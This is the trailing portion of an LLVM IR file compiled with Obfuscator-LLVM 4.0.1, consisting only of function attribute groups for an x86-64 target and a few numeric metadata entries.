attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146482628}
!2 = !{i32 -2146481937}
!3 = !{i32 -2146481188}
!4 = !{i32 -2146480365}
!5 = !{i32 -2146479443}
!6 = !{i32 -2146478060}
